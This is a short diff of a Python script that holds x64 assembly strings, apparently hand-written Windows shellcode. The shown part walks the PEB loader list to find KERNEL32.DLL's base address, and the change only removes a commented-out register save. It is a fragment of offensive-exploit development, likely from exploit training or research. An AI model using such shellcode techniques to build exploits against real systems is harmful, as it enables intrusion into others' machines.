@@ -30,7 +30,6 @@ def main():
         "   mov rsi, [rsi]                  ;"  # RSI = InMem.Flink (next module)
         "   cmp [rdi+0xc*2], cx             ;"  # KERNEL32.DLL is 12 bytes long, if 25th position of UNICODE is NULL, bingo
         "   jne next_module                 ;"  # If not, keep looking
-        #"   mov r12, rbx                    ;"  # Save kernel32.dll base address to R12
         
         " get_find_function_ret:            "
         "   jmp find_function_short         ;"  # A short jump to call function backwards
